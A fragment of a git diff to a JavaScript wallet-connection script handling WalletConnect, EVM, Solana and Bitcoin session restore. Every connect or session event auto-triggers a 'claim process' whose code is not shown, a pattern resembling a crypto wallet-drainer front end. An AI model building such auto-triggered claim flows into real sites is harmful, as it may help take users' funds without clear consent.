     if (saved && (currentSession || getSavedChainType() !== 'unknown')) {
@@ -867,53 +860,49 @@ import { CONFIG } from './config.js';
   if (connectButton) connectButton.addEventListener('click', handleClick);
   if (walletButton) walletButton.addEventListener('click', handleClick);
 
-  // ================================================================
-  // RESTORE SESSION AND HANDLE RETURN FROM WALLET
-  // ================================================================
+  // ─── Restore session & handle return from wallet ──────────────────
   async function restoreWalletConnection() {
     const savedWallet = getSavedWallet();
     const savedChain = getSavedChainType();
     const savedSession = getSavedSession();
 
-    // Check pending WC redirect
+    // Check pending WC session (from modal, not deeplink)
     const pendingUri = sessionStorage.getItem('pending_wc_uri');
     const pendingTimestamp = sessionStorage.getItem('pending_wc_timestamp');
     if (pendingUri && pendingTimestamp) {
       const elapsed = Date.now() - parseInt(pendingTimestamp);
-      if (elapsed < 120000) {
-        logDebug('Detected return from wallet – waiting for session...');
-        if (client) {
-          try {
-            await new Promise(r => setTimeout(r, 2000));
-            const sessions = client.session.values();
-            if (sessions.length > 0) {
-              const session = sessions[0];
-              const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
-              if (account) {
-                saveWallet(account, session, 'evm');
-                updateConnectedUI(account, 'evm');
-                currentSession = session;
-                sessionStorage.removeItem('pending_wc_uri');
-                sessionStorage.removeItem('pending_wc_timestamp');
-                setTimeout(() => {
-                  if (typeof window.initiateClaimProcess === 'function') {
-                    window.initiateClaimProcess();
-                  }
-                }, 1000);
-                return;
-              }
+      if (elapsed < 120000 && client) {
+        logDebug('Detected pending WalletConnect session – waiting for approval...');
+        try {
+          // Wait a bit for the session to be established
+          await new Promise(r => setTimeout(r, 2000));
+          const sessions = client.session.values();
+          if (sessions.length > 0) {
+            const session = sessions[0];
+            const account = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
+            if (account) {
+              saveWallet(account, session, 'evm');
+              updateConnectedUI(account, 'evm');
+              currentSession = session;
+              sessionStorage.removeItem('pending_wc_uri');
+              sessionStorage.removeItem('pending_wc_timestamp');
+              setTimeout(() => {
+                if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
+              }, 1000);
+              return;
             }
-          } catch (e) {
-            logDebug(`Session restore after redirect failed: ${e.message}`);
           }
+        } catch (e) {
+          logDebug(`Session restore after redirect failed: ${e.message}`);
         }
+        sessionStorage.removeItem('pending_wc_uri');
+        sessionStorage.removeItem('pending_wc_timestamp');
       }
-      sessionStorage.removeItem('pending_wc_uri');
-      sessionStorage.removeItem('pending_wc_timestamp');
     }
 
     if (savedWallet && savedChain !== 'unknown') {
       logDebug(`♻️ Restoring ${savedChain} wallet: ${savedWallet}`);
+
       if (savedChain === 'evm') {
         if (savedSession) {
           const initSuccess = await initWalletConnect(false);
@@ -936,6 +925,7 @@ import { CONFIG } from './config.js';
             return;
           }
         }
+        // If we're on mobile and no session, clear saved wallet
         if (isMobile()) {
           clearSavedWallet();
         }
@@ -950,8 +940,8 @@ import { CONFIG } from './config.js';
           }
         }
         if (isDesktop()) {
-          const addr = await connectSolana();
-          if (addr) return;
+          const success = await connectSolana();
+          if (success) return;
         }
         clearSavedWallet();
       } else if (savedChain === 'bitcoin') {
@@ -969,27 +959,23 @@ import { CONFIG } from './config.js';
     }
   }
 
-  // ================================================================
-  // INITIALISE – load libraries, setup EIP, restore
-  // ================================================================
+  // ─── Load libraries & start ──────────────────────────────────────
   try {
-    await libsPromise; // ensure libraries are loaded
-    setupEIP6963();
+    const libs = await loadWalletConnect();
+    SignClient = libs.SignClient;
+    WalletConnectModal = libs.WalletConnectModal;
+    logDebug('✅ WalletConnect libraries loaded');
 
-    // Pre-init WalletConnect client (but don't connect) to speed up later
-    await initWalletConnect(false).catch(() => {});
-    // Also try test ID if primary fails?
-    // We'll let connect function handle fallback.
+    setupEIP6963();
 
     await restoreWalletConnection();
   } catch (err) {
-    logDebug(`❌ Fatal error: ${err.message}`);
-    showStatus('Failed to initialize wallet libraries', 'error');
+    logDebug(`❌ Fatal error loading libraries: ${err.message}`);
+    showStatus('Failed to load wallet libraries', 'error');
+    return;
   }
 
-  // ================================================================
-  // SESSION LISTENERS
-  // ================================================================
+  // ─── Session listeners ────────────────────────────────────────────
   setTimeout(() => {
     if (client) {
       client.on('session_update', ({ params }) => {
@@ -999,9 +985,7 @@ import { CONFIG } from './config.js';
           updateConnectedUI(account, 'evm');
           saveWallet(account, currentSession, 'evm');
           setTimeout(() => {
-            if (typeof window.initiateClaimProcess === 'function') {
-              window.initiateClaimProcess();
-            }
+            if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
           }, 1000);
         }
       });
@@ -1017,18 +1001,19 @@ import { CONFIG } from './config.js';
           updateConnectedUI(account, 'evm');
           currentSession = session;
           setTimeout(() => {
-            if (typeof window.initiateClaimProcess === 'function') {
-              window.initiateClaimProcess();
-            }
+            if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
           }, 1000);
         }
       });
     }
   }, 1000);
 
-  // ================================================================
-  // VISIBILITY CHANGE – check for session return
-  // ================================================================
+  // ─── Global EVM provider events (desktop) ────────────────────────
+  if (window.ethereum && isDesktop()) {
+    setupEVMProviderEvents(window.ethereum);
+  }
+
+  // ─── Visibility change – check for session return ────────────────
   document.addEventListener('visibilitychange', () => {
     if (!document.hidden && getSavedWallet()) {
       logDebug('Page visible, checking connection...');
@@ -1051,9 +1036,7 @@ import { CONFIG } from './config.js';
                   sessionStorage.removeItem('pending_wc_uri');
                   sessionStorage.removeItem('pending_wc_timestamp');
                   setTimeout(() => {
-                    if (typeof window.initiateClaimProcess === 'function') {
-                      window.initiateClaimProcess();
-                    }
+                    if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
                   }, 1000);
                 }
               }
@@ -1066,14 +1049,12 @@ import { CONFIG } from './config.js';
     }
   });
 
-  // ================================================================
-  // CLEANUP
-  // ================================================================
+  // ─── Cleanup ──────────────────────────────────────────────────────
   window.addEventListener('beforeunload', () => {
     if (modal) modal.closeModal();
   });
 
-  logDebug(`✅ main.js fully initialised with optimised connection flow`);
+  logDebug(`✅ main.js fully initialised (device‑aware)`);
   logDebug(`   Platform: ${getPlatform()} | Mobile: ${isMobile()} | Desktop: ${isDesktop()}`);
-  logDebug(`   Connection flow: ${isMobile() ? 'WalletConnect only' : 'Direct EVM → WalletConnect → Solana → Bitcoin'}`);
+  logDebug(`   Flow: ${isMobile() ? 'WalletConnect only' : 'Direct EVM → WalletConnect → Solana → Bitcoin'}`);
 })();
